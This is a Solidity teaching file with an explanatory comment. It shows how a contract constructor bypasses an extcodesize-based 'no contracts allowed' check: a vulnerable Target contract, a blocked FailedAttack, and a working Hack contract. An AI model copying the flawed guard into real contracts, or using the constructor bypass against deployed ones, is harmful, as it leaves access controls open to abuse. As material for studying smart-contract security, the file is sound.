// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.24;

// The Target contract contains a boolean state variable and functions 
// to check if an address is a contract and to execute a protected function.
contract Target {
    // A public boolean variable to track if the protected function was successfully called.
    bool public passed; 

    // This function checks if the given address is a contract.
    function isContract(address _account) public view returns (bool) {
        // The following code checks if the address is a contract by using the extcodesize assembly opcode.
        // The extcodesize returns 0 for contracts in construction phase, 
        // since the code is only stored at the end of the constructor execution.
        uint256 size;
        assembly {
            // Get the size of the code at the given address.
            size := extcodesize(_account) 
        }
        // If the size is greater than 0, it is a contract.
        return size > 0; 
    }

    // The protected function can only be called by externally owned accounts (EOAs), not contracts.
    function protected() external {
        // Ensure the caller is not a contract.
        require(!isContract(msg.sender), "No contract allowed!");
        // Set the passed variable to true if the caller is an EOA. 
        passed = true; 
    }
}

// The FailedAttack contract attempts to call the protected function of the Target contract but will fail.
contract FailedAttack {
    // This function attempts to call the protected function of the Target contract.
    function tryPass(address _target) external {
        // This call will fail because Target's protected function blocks calls from contracts.
        Target(_target).protected();
    }
}

// The Hack contract demonstrates a way to bypass the isContract check during contract creation.
contract Hack {
    // A public boolean variable to store if the address is a contract.
    bool public isContract; 
    // A public address variable to store the address of this contract.
    address public addr; 

    // The constructor of the Hack contract is called during its creation.
    // At this time, the extcodesize of the contract is 0, bypassing the isContract() check in the Target contract.
    constructor(address _target) {
        // This call to the protected function will succeed because the code size is 0 during the constructor execution.
        Target(_target).protected();
    }
}
/*
### Explanation:
1. **Target Contract:**
   - `passed`: 
        A public boolean variable indicating whether the protected function was successfully called.
   - `isContract`: 
        This function checks if the given address is a contract using the `extcodesize` assembly opcode.
   - `protected`: 
        This function can only be called by externally owned accounts (EOAs), not by contracts.

2. **FailedAttack Contract:**
   - `tryPass`: 
        This function attempts to call the `protected` function of the `Target` contract but will fail 
        because the `Target` contract blocks calls from contracts.

3. **Hack Contract:**
   - `isContract` and `addr`: Public variables to store the contract's status and address.
   - The constructor of the `Hack` contract calls the `protected` function of the `Target` contract during its creation. 
        During the creation phase, the contract's code size is 0, allowing it to bypass the `isContract` check 
        and successfully call the `protected` function.

*/
